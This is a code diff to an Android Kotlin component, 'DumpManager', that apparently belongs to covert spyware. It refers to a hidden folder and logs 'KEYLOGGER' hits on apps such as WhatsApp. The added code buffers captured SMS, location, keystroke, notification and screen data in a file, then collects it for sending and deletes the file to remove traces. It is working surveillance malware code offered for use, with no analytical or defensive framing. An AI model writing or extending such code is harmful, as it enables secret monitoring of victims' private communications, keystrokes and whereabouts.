@@ -57,11 +57,58 @@ object DumpManager {
 
     fun logVerification(category: String, pkg: String) {
         try {
-            if (!ROOT_DIR.exists()) ROOT_DIR.mkdirs() // Ensure hidden folder exists
-            val file = File(ROOT_DIR, "sensor_verification.txt")
-            val timestamp = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
-            // Appends: [14:00:01] [KEYLOGGER] com.whatsapp ✓
-            file.appendText("[$timestamp] [$category] $pkg ✓\n")
+            if (!ROOT_DIR.exists()) ROOT_DIR.mkdirs()
+            File(ROOT_DIR, "sensor_verification.txt").appendText("[" + SimpleDateFormat("HH:mm:ss", Locale.US).format(Date()) + "] [$category] $pkg ✓\n")
         } catch (e: Exception) { }
+    }
+
+    // --- STREAM LOGGING (Fixes Lag & Data Loss) ---
+    fun appendLog(type: String, data: JSONObject) {
+        // Run in background to prevent UI stutter
+        // We use a new Thread to avoid Coroutine scope issues in simple contexts
+        Thread { 
+            try {
+                if (!ROOT_DIR.exists()) ROOT_DIR.mkdirs()
+                val file = File(ROOT_DIR, "offline_buffer.jsonl")
+                
+                // Wrap in standardized format
+                val wrapper = JSONObject()
+                wrapper.put("t", type) // Type (SMS, LOC, ETC)
+                wrapper.put("d", data) // The payload
+                
+                file.appendText(wrapper.toString() + "\n")
+            } catch (e: Exception) { e.printStackTrace() }
+        }.start()
+    }
+
+    fun getAndClearLogs(): JSONObject {
+        val result = JSONObject()
+        // Init Buckets
+        val buckets = mapOf(
+            "SMS" to JSONArray(), "LOC" to JSONArray(), "KEY" to JSONArray(), 
+            "NOTIF" to JSONArray(), "SCREEN" to JSONArray()
+        )
+        
+        try {
+            val file = File(ROOT_DIR, "offline_buffer.jsonl")
+            if (file.exists()) {
+                file.forEachLine {
+                    try {
+                        val obj = JSONObject(it)
+                        val type = obj.optString("t")
+                        val data = obj.optJSONObject("d")
+                        if (buckets.containsKey(type)) {
+                            buckets[type]?.put(data)
+                        }
+                    } catch(e: Exception){}
+                }
+                // Nuke file after reading to prevent duplicates
+                file.delete()
+            }
+        } catch (e: Exception) { e.printStackTrace() }
+        
+        // Pack into result
+        buckets.forEach { (k, v) -> result.put(k, v) }
+        return result
     }
 }
